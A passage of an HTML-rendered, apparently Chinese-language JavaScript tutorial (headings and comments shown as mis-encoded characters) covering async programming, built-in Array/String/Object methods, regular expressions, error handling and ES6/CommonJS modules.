<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="kd">let</span><span class="w"> </span><span class="nx">student</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Student</span><span class="p">(</span><span class="s2">&quot;Alice&quot;</span><span class="p">,</span><span class="w"> </span><span class="mf">10</span><span class="p">);</span>
<span class="nx">student</span><span class="p">.</span><span class="nx">greet</span><span class="p">();</span><span class="w">  </span><span class="c1">// &quot;Hello, I&#39;m Alice&quot;</span>
<span class="nx">student</span><span class="p">.</span><span class="nx">study</span><span class="p">();</span><span class="w">  </span><span class="c1">// &quot;Alice is studying in grade 10&quot;</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å¼‚æ­¥ç¼–ç¨‹">å¼‚æ­¥ç¼–ç¨‹</h2>

      <h3 id="å›è°ƒå‡½æ•°callback">å›è°ƒå‡½æ•°ï¼ˆCallbackï¼‰</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">fetchData</span><span class="p">(</span><span class="nx">callback</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">setTimeout</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">callback</span><span class="p">(</span><span class="s2">&quot;Data loaded&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">},</span><span class="w"> </span><span class="mf">1000</span><span class="p">);</span>
<span class="p">}</span>

<span class="nx">fetchData</span><span class="p">((</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span><span class="w">  </span><span class="c1">// &quot;Data loaded&quot; (1ç§’å)</span>
<span class="p">});</span>
</code></pre>
      </div>

      <h3 id="promise">Promise</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">fetchData</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">,</span><span class="w"> </span><span class="nx">reject</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">setTimeout</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="nx">success</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">success</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">resolve</span><span class="p">(</span><span class="s2">&quot;Data loaded&quot;</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">reject</span><span class="p">(</span><span class="s2">&quot;Error occurred&quot;</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">},</span><span class="w"> </span><span class="mf">1000</span><span class="p">);</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">}</span>

<span class="c1">// ä½¿ç”¨ .then()</span>
<span class="nx">fetchData</span><span class="p">()</span>
<span class="w">    </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">data</span><span class="p">))</span>
<span class="w">    </span><span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">error</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">error</span><span class="p">));</span>

<span class="c1">// Promise é“¾å¼è°ƒç”¨</span>
<span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://api.example.com/data&#39;</span><span class="p">)</span>
<span class="w">    </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
<span class="w">    </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">data</span><span class="p">))</span>
<span class="w">    </span><span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">error</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">error</span><span class="p">));</span>
</code></pre>
      </div>

      <h3 id="asyncawaites2017">Async/Awaitï¼ˆES2017+ï¼‰</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">loadData</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://api.example.com/data&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">();</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">error</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">loadData</span><span class="p">();</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å¸¸ç”¨å†…ç½®å¯¹è±¡å’Œæ–¹æ³•">å¸¸ç”¨å†…ç½®å¯¹è±¡å’Œæ–¹æ³•</h2>

      <h3 id="array-æ–¹æ³•">Array æ–¹æ³•</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="nx">arr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="mf">3</span><span class="p">,</span><span class="w"> </span><span class="mf">4</span><span class="p">,</span><span class="w"> </span><span class="mf">5</span><span class="p">];</span>

<span class="c1">// éå†</span>
<span class="nx">arr</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">item</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">item</span><span class="p">));</span>

<span class="c1">// æ˜ å°„</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">doubled</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">arr</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">x</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">2</span><span class="p">);</span><span class="w">  </span><span class="c1">// [2, 4, 6, 8, 10]</span>

<span class="c1">// è¿‡æ»¤</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">evens</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">arr</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">x</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mf">2</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span><span class="w">  </span><span class="c1">// [2, 4]</span>

<span class="c1">// å½’çº¦</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">sum</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">arr</span><span class="p">.</span><span class="nx">reduce</span><span class="p">((</span><span class="nx">acc</span><span class="p">,</span><span class="w"> </span><span class="nx">x</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">acc</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">x</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span><span class="w">  </span><span class="c1">// 15</span>

<span class="c1">// æŸ¥æ‰¾</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">found</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">arr</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="nx">x</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">3</span><span class="p">);</span><span class="w">  </span><span class="c1">// 4</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">arr</span><span class="p">.</span><span class="nx">findIndex</span><span class="p">(</span><span class="nx">x</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">3</span><span class="p">);</span><span class="w">  </span><span class="c1">// 3</span>

<span class="c1">// åˆ¤æ–­</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">hasEven</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">arr</span><span class="p">.</span><span class="nx">some</span><span class="p">(</span><span class="nx">x</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mf">2</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span><span class="w">  </span><span class="c1">// true</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">allPositive</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">arr</span><span class="p">.</span><span class="nx">every</span><span class="p">(</span><span class="nx">x</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span><span class="w">  </span><span class="c1">// true</span>

<span class="c1">// å±•å¹³</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">nested</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="mf">3</span><span class="p">,</span><span class="w"> </span><span class="mf">4</span><span class="p">]]];</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">flat</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">nested</span><span class="p">.</span><span class="nx">flat</span><span class="p">(</span><span class="mf">2</span><span class="p">);</span><span class="w">  </span><span class="c1">// [1, 2, 3, 4]</span>
</code></pre>
      </div>

      <h3 id="string-æ–¹æ³•">String æ–¹æ³•</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;Hello World&quot;</span><span class="p">;</span>

<span class="c1">// æŸ¥æ‰¾</span>
<span class="nx">str</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&quot;World&quot;</span><span class="p">);</span><span class="w">  </span><span class="c1">// 6</span>
<span class="nx">str</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&quot;World&quot;</span><span class="p">);</span><span class="w">  </span><span class="c1">// true</span>
<span class="nx">str</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s2">&quot;Hello&quot;</span><span class="p">);</span><span class="w">  </span><span class="c1">// true</span>
<span class="nx">str</span><span class="p">.</span><span class="nx">endsWith</span><span class="p">(</span><span class="s2">&quot;World&quot;</span><span class="p">);</span><span class="w">  </span><span class="c1">// true</span>

<span class="c1">// æå–</span>
<span class="nx">str</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">5</span><span class="p">);</span><span class="w">  </span><span class="c1">// &quot;Hello&quot;</span>
<span class="nx">str</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">5</span><span class="p">);</span><span class="w">  </span><span class="c1">// &quot;Hello&quot;</span>
<span class="nx">str</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">5</span><span class="p">);</span><span class="w">  </span><span class="c1">// &quot;Hello&quot; (å·²åºŸå¼ƒ)</span>

<span class="c1">// æ›¿æ¢</span>
<span class="nx">str</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&quot;World&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;JavaScript&quot;</span><span class="p">);</span><span class="w">  </span><span class="c1">// &quot;Hello JavaScript&quot;</span>
<span class="nx">str</span><span class="p">.</span><span class="nx">replaceAll</span><span class="p">(</span><span class="s2">&quot;l&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;L&quot;</span><span class="p">);</span><span class="w">  </span><span class="c1">// &quot;HeLLo WorLd&quot;</span>

<span class="c1">// åˆ†å‰²ä¸è¿æ¥</span>
<span class="nx">str</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">);</span><span class="w">  </span><span class="c1">// [&quot;Hello&quot;, &quot;World&quot;]</span>
<span class="p">[</span><span class="s2">&quot;Hello&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;World&quot;</span><span class="p">].</span><span class="nx">join</span><span class="p">(</span><span class="s2">&quot;-&quot;</span><span class="p">);</span><span class="w">  </span><span class="c1">// &quot;Hello-World&quot;</span>

<span class="c1">// å¤§å°å†™</span>
<span class="nx">str</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">();</span><span class="w">  </span><span class="c1">// &quot;hello world&quot;</span>
<span class="nx">str</span><span class="p">.</span><span class="nx">toUpperCase</span><span class="p">();</span><span class="w">  </span><span class="c1">// &quot;HELLO WORLD&quot;</span>

<span class="c1">// å»ç©ºæ ¼</span>
<span class="s2">&quot;  hello  &quot;</span><span class="p">.</span><span class="nx">trim</span><span class="p">();</span><span class="w">  </span><span class="c1">// &quot;hello&quot;</span>
<span class="s2">&quot;  hello  &quot;</span><span class="p">.</span><span class="nx">trimStart</span><span class="p">();</span><span class="w">  </span><span class="c1">// &quot;hello  &quot;</span>
<span class="s2">&quot;  hello  &quot;</span><span class="p">.</span><span class="nx">trimEnd</span><span class="p">();</span><span class="w">  </span><span class="c1">// &quot;  hello&quot;</span>
</code></pre>
      </div>

      <h3 id="object-æ–¹æ³•">Object æ–¹æ³•</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="nx">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="nx">a</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="nx">b</span><span class="o">:</span><span class="w"> </span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="nx">c</span><span class="o">:</span><span class="w"> </span><span class="mf">3</span><span class="p">};</span>

<span class="c1">// è·å–é”®ã€å€¼ã€æ¡ç›®</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">obj</span><span class="p">);</span><span class="w">  </span><span class="c1">// [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">values</span><span class="p">(</span><span class="nx">obj</span><span class="p">);</span><span class="w">  </span><span class="c1">// [1, 2, 3]</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">entries</span><span class="p">(</span><span class="nx">obj</span><span class="p">);</span><span class="w">  </span><span class="c1">// [[&quot;a&quot;, 1], [&quot;b&quot;, 2], [&quot;c&quot;, 3]]</span>

<span class="c1">// åˆå¹¶å¯¹è±¡</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">merged</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Object</span><span class="p">.</span><span class="nx">assign</span><span class="p">({},</span><span class="w"> </span><span class="nx">obj</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="nx">d</span><span class="o">:</span><span class="w"> </span><span class="mf">4</span><span class="p">});</span><span class="w">  </span><span class="c1">// {a: 1, b: 2, c: 3, d: 4}</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">spread</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{...</span><span class="nx">obj</span><span class="p">,</span><span class="w"> </span><span class="nx">d</span><span class="o">:</span><span class="w"> </span><span class="mf">4</span><span class="p">};</span><span class="w">  </span><span class="c1">// {a: 1, b: 2, c: 3, d: 4}</span>

<span class="c1">// å†»ç»“å¯¹è±¡</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">freeze</span><span class="p">(</span><span class="nx">obj</span><span class="p">);</span>
<span class="nx">obj</span><span class="p">.</span><span class="nx">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">100</span><span class="p">;</span><span class="w">  </span><span class="c1">// æ— æ•ˆ</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">obj</span><span class="p">.</span><span class="nx">a</span><span class="p">);</span><span class="w">  </span><span class="c1">// 1</span>

<span class="c1">// å¯†å°å¯¹è±¡</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">seal</span><span class="p">(</span><span class="nx">obj</span><span class="p">);</span>
<span class="nx">obj</span><span class="p">.</span><span class="nx">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">100</span><span class="p">;</span><span class="w">  </span><span class="c1">// å¯ä»¥ä¿®æ”¹</span>
<span class="ow">delete</span><span class="w"> </span><span class="nx">obj</span><span class="p">.</span><span class="nx">a</span><span class="p">;</span><span class="w">  </span><span class="c1">// æ— æ•ˆ</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ­£åˆ™è¡¨è¾¾å¼">æ­£åˆ™è¡¨è¾¾å¼</h2>

      <h3 id="åŸºæœ¬è¯­æ³•">åŸºæœ¬è¯­æ³•</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åˆ›å»ºæ­£åˆ™</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">regex1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/pattern/gi</span><span class="p">;</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">regex2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">RegExp</span><span class="p">(</span><span class="s1">&#39;pattern&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;gi&#39;</span><span class="p">);</span>

<span class="c1">// æ ‡å¿—</span>
<span class="c1">// g - å…¨å±€åŒ¹é…</span>
<span class="c1">// i - å¿½ç•¥å¤§å°å†™</span>
<span class="c1">// m - å¤šè¡ŒåŒ¹é…</span>
<span class="c1">// s - . åŒ¹é…æ¢è¡Œç¬¦</span>
<span class="c1">// u - Unicode æ¨¡å¼</span>
<span class="c1">// y - ç²˜æ€§åŒ¹é…</span>

<span class="c1">// å¸¸ç”¨æ–¹æ³•</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;Hello World 123&quot;</span><span class="p">;</span>

<span class="nx">str</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/\d+/</span><span class="p">);</span><span class="w">  </span><span class="c1">// [&quot;123&quot;]</span>
<span class="nx">str</span><span class="p">.</span><span class="nx">search</span><span class="p">(</span><span class="sr">/World/</span><span class="p">);</span><span class="w">  </span><span class="c1">// 6</span>
<span class="nx">str</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/\d+/</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;456&quot;</span><span class="p">);</span><span class="w">  </span><span class="c1">// &quot;Hello World 456&quot;</span>
<span class="nx">str</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="sr">/\s+/</span><span class="p">);</span><span class="w">  </span><span class="c1">// [&quot;Hello&quot;, &quot;World&quot;, &quot;123&quot;]</span>

<span class="sr">/World/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">str</span><span class="p">);</span><span class="w">  </span><span class="c1">// true</span>
<span class="sr">/\d+/</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">str</span><span class="p">);</span><span class="w">  </span><span class="c1">// [&quot;123&quot;, index: 12, input: &quot;Hello World 123&quot;]</span>
</code></pre>
      </div>

      <h3 id="å¸¸ç”¨æ¨¡å¼">å¸¸ç”¨æ¨¡å¼</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ•°å­—</span>
<span class="sr">/\d+/</span><span class="w">  </span><span class="c1">// ä¸€ä¸ªæˆ–å¤šä¸ªæ•°å­—</span>
<span class="sr">/^\d+$/</span><span class="w">  </span><span class="c1">// æ•´è¡Œéƒ½æ˜¯æ•°å­—</span>

<span class="c1">// å­—æ¯</span>
<span class="sr">/[a-zA-Z]+/</span><span class="w">  </span><span class="c1">// ä¸€ä¸ªæˆ–å¤šä¸ªå­—æ¯</span>

<span class="c1">// é‚®ç®±</span>
<span class="sr">/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/</span>

<span class="c1">// URL</span>
<span class="sr">/^https?:\/\/.+/</span>

<span class="c1">// æ‰‹æœºå·ï¼ˆä¸­å›½ï¼‰</span>
<span class="sr">/^1[3-9]\d{9}$/</span>

<span class="c1">// æ•è·ç»„</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">match</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;2024-12-17&quot;</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/(\d{4})-(\d{2})-(\d{2})/</span><span class="p">);</span>
<span class="c1">// match[0] = &quot;2024-12-17&quot;</span>
<span class="c1">// match[1] = &quot;2024&quot;</span>
<span class="c1">// match[2] = &quot;12&quot;</span>
<span class="c1">// match[3] = &quot;17&quot;</span>
</code></pre>
      </div>

      <hr />

      <h2 id="é”™è¯¯å¤„ç†">é”™è¯¯å¤„ç†</h2>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// try-catch</span>
<span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// å¯èƒ½å‡ºé”™çš„ä»£ç </span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">riskyOperation</span><span class="p">();</span>
<span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">&quot;Error occurred:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">error</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
<span class="p">}</span><span class="w"> </span><span class="k">finally</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// æ— è®ºæ˜¯å¦å‡ºé”™éƒ½ä¼šæ‰§è¡Œ</span>
<span class="w">    </span><span class="nx">cleanup</span><span class="p">();</span>
<span class="p">}</span>

<span class="c1">// æŠ›å‡ºé”™è¯¯</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">divide</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="w"> </span><span class="nx">b</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="ne">Error</span><span class="p">(</span><span class="s2">&quot;Division by zero&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">b</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// è‡ªå®šä¹‰é”™è¯¯</span>
<span class="kd">class</span><span class="w"> </span><span class="nx">CustomError</span><span class="w"> </span><span class="k">extends</span><span class="w"> </span><span class="ne">Error</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">message</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">super</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;CustomError&quot;</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="k">throw</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">CustomError</span><span class="p">(</span><span class="s2">&quot;Something went wrong&quot;</span><span class="p">);</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ¨¡å—åŒ–">æ¨¡å—åŒ–</h2>

      <h3 id="es6-æ¨¡å—">ES6 æ¨¡å—</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// math.js</span>
<span class="k">export</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">add</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="w"> </span><span class="nx">b</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">b</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">export</span><span class="w"> </span><span class="kd">const</span><span class="w"> </span><span class="nx">PI</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">3.14159</span><span class="p">;</span>

<span class="k">export</span><span class="w"> </span><span class="k">default</span><span class="w"> </span><span class="kd">class</span><span class="w"> </span><span class="nx">Calculator</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// ...</span>
<span class="p">}</span>

<span class="c1">// main.js</span>
<span class="k">import</span><span class="w"> </span><span class="nx">Calculator</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">add</span><span class="p">,</span><span class="w"> </span><span class="nx">PI</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s1">&#39;./math.js&#39;</span><span class="p">;</span>
<span class="k">import</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="kr">as</span><span class="w"> </span><span class="nx">math</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s1">&#39;./math.js&#39;</span><span class="p">;</span>

<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">add</span><span class="p">(</span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">));</span><span class="w">  </span><span class="c1">// 3</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">PI</span><span class="p">);</span><span class="w">  </span><span class="c1">// 3.14159</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">calc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Calculator</span><span class="p">();</span>
</code></pre>
      </div>

      <h3 id="commonjsnodejs">CommonJSï¼ˆNode.jsï¼‰</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// math.js</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">add</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="w"> </span><span class="nx">b</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">b</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">add</span><span class="p">,</span>
